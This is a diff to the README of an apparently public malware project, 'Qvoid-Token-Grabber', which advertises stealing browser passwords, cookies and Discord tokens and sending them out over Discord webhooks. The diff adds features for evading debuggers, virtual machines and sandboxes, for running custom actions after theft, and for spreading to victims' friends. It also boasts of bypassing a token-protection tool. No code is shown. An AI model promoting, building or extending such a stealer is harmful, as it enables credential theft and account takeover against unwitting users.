@@ -1,9 +1,11 @@
-## 🤯 Under maintenance (If someone getting errors and it's not working. Open an issue or even better add me in Discord) 🤯
-## I will upload a newer version in 22/09/2021 that should work for everyone.
+## 🤯 Under maintenance 🤯
 
 # 🔥 Qvoid-Token-Grabber
  Advanced grabber that grabs browser passwords, cookies, and Discord tokens with the computer information.
 ### 🐵 Features
+   - [x] Protection (AntiDebug, AntiEmulation, AntiWebSniffers, AntiVM, AntiSandboxie) which is controlled through the settings file.
+   - [x] Gateway support, you can create your execution with the built-in library that I made; (There is a block of code after the grabbing which you can add your things to do, I added as an example Spread which is controlled through the settings file).
+   - [x] Spread to the victim's friends after grabbing. 
    - [x] Discord webhooks integration. 
    - [x] Grabs tokens from all installed clients even if the main path changed and deletes accounts duplicates.
    - [x] 18 hardcoded known tokens locations.
@@ -24,7 +26,7 @@
  if you liked it consider to ⭐ this project and 🕵️ (follow) me 🤔.
  
 ### ⛔ What can I do against token grabbers?
-To be protected against token grabbers, you are more than welcome to install my Anti-Token-Grabber which is located on my GitHub. [I will upload it later meanwhile try https://github.com/andro2157/DiscordTokenProtector although this grabber bypassing it, other grabbers not]
+To be protected against token grabbers, you are more than welcome to install my Anti-Token-Grabber which is located on my GitHub. [I will upload it later meanwhile try https://github.com/andro2157/DiscordTokenProtector although this grabber bypassing it, other grabbers are not]
  
 ### 🤓 This project is under Berkeley Software Distribution (BSD) license.
 * The source code doesn’t need to be public when a distribution of the software is made.
@@ -43,4 +45,3 @@ The author does not hold any responsibility for the bad use of this tool, rememb
 
 ### ✅ Results (I don't have saved passwords 🥸)
  ![alt text](https://media.discordapp.net/attachments/825091638782459912/888508945558302750/Untitled-1.png?width=348&height=676)
-
